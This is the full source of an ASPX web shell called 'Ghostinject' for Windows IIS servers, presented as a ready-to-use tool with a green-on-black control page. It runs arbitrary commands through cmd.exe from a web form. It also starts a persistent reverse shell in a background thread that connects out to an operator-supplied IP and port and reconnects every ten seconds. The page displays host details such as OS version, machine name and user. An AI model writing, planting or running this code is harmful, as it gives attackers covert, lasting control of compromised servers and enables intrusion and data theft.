<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Threading" %>

<script runat="server">
// Ghostinject - ASPX persistent reverse shell for IIS
protected void Page_Load(object sender, EventArgs e)
{
    Response.ContentType = "text/html";
    
    // Command execution
    if (Request.HttpMethod == "POST" && Request.Form["cmd"] != null)
    {
        string output = ExecuteCommand(Request.Form["cmd"]);
        Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
        Response.End();
        return;
    }
    
    // Reverse shell (persistent)
    if (Request.HttpMethod == "POST" && Request.Form["rev_host"] != null && Request.Form["rev_port"] != null)
    {
        string host = Request.Form["rev_host"];
        int port = int.Parse(Request.Form["rev_port"]);
        bool success = StartPersistentReverseShell(host, port);
        Response.Write(success ? "Ghostinject: Persistent reverse shell started (auto-reconnect). Keep listener open!" : "Failed to start shell.");
        Response.End();
        return;
    }
    
    RenderGUI();
}

private string ExecuteCommand(string cmd)
{
    try
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        using (Process p = Process.Start(psi))
        {
            string output = p.StandardOutput.ReadToEnd();
            string error = p.StandardError.ReadToEnd();
            p.WaitForExit(5000);
            return output + error;
        }
    }
    catch (Exception ex) { return "[Error: " + ex.Message + "]"; }
}

private bool StartPersistentReverseShell(string host, int port)
{
    try
    {
        // Run in a background thread with auto-reconnect loop
        Thread t = new Thread(() => PersistentReverseShell(host, port));
        t.IsBackground = true;
        t.Start();
        return true;
    }
    catch { return false; }
}

private void PersistentReverseShell(string host, int port)
{
    while (true)
    {
        try
        {
            using (TcpClient client = new TcpClient())
            {
                client.Connect(host, port);
                using (NetworkStream stream = client.GetStream())
                using (StreamReader reader = new StreamReader(stream))
                using (StreamWriter writer = new StreamWriter(stream))
                {
                    writer.AutoFlush = true;
                    while (client.Connected)
                    {
                        string cmd = reader.ReadLine();
                        if (cmd == null) break;
                        if (cmd.ToLower() == "exit") break;
                        string output = ExecuteCommand(cmd);
                        writer.Write(output + "\n");
                    }
                }
            }
        }
        catch { }
        Thread.Sleep(10000); // wait 10 seconds before reconnecting
    }
}

private void RenderGUI()
{
    Response.Write(@"
<!DOCTYPE html>
<html>
<head><title>Ghostinject | ASPX Persistent Shell</title>
<style>body{background:#0a0f0a;color:#0f0;font-family:monospace;padding:2em;} input,button{background:#222;color:#0f0;border:1px solid #0f0;} button{cursor:pointer;}</style>
</head>
<body>
<h2>👻 Ghostinject - Windows IIS Persistent Shell</h2>
<ul>
<li>Sistema: " + Environment.OSVersion + @"</li>
<li>Máquina: " + Environment.MachineName + @"</li>
<li>Usuário: " + Environment.UserName + @"</li>
<li>Diretório: " + Environment.CurrentDirectory + @"</li>
<li>.NET: " + Environment.Version + @"</li>
<li>IIS: " + Request.ServerVariables["SERVER_SOFTWARE"] + @"</li>
</ul>
<h3>💻 Command</h3>
<form method='post' id='cmdForm'><input type='text' name='cmd' size='70'><button type='submit'>Run</button></form>
<div id='cmdResult'></div>
<h3>🔌 Persistent Reverse Shell (auto‑reconnect)</h3>
<form method='post'><input type='text' name='rev_host' placeholder='Your IP' required><br><input type='text' name='rev_port' placeholder='Port' required><br><button type='submit'>🚀 Start Ghostinject</button></form>
<script>const f=document.getElementById('cmdForm');f.addEventListener('submit',async e=>{e.preventDefault();let d=new FormData(f);let r=await fetch('',{method:'POST',body:d});document.getElementById('cmdResult').innerHTML=await r.text();});</script>
</body>
</html>");
}
</script>
